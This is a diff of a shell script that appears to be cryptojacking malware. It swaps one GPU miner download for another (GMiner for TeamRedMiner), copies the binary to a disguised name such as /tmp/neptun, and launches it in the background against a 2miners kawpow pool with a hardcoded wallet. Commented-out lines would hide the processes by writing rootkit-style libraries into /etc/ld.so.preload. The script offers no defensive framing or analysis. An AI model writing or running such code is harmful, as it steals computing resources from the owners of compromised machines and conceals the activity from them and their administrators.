@@ -12,12 +12,12 @@ cp /tmp/ml/t-rex /tmp/jupyternotebookagent
 #./tmp/ml/make
 #mv /tmp/ml/libprocesshider.so /usr/local/lib/
 #echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-wget https://github.com/develsoftware/GMinerRelease/releases/download/3.43/gminer_3_43_linux64.tar.xz
-mv gminer_3_43_linux64.tar.xz /tmp/ml/gminer_3_43_linux64.tar.xz
-tar xvf /tmp/ml/gminer_3_43_linux64.tar.xz -C /tmp/ml
-cp /tmp/ml/miner /tmp/neptun
-/tmp/neptun --algo kawpow --server xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 -p x & 
-mv amd/ /tmp/ml/
+wget https://github.com/todxx/teamredminer/releases/download/v0.10.14/teamredminer-v0.10.14-linux.tgz
+mv teamredminer-v0.10.14-linux.tgz /tmp/ml/teamredminer-v0.10.14-linux.tgz
+tar zxvf teamredminer-v0.10.14-linux.tgz -C /tmp/ml
+cp /tmp/ml/teamredminer /tmp/neptun
+/tmp/neptun -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 & 
+cp -r /amd /tmp/ml/
 #./tmp/ml/amd/make
 #mv /tmp/ml/surec.so /usr/local/lib/
 #echo /usr/local/lib/surec.so >> /etc/ld.so.preload
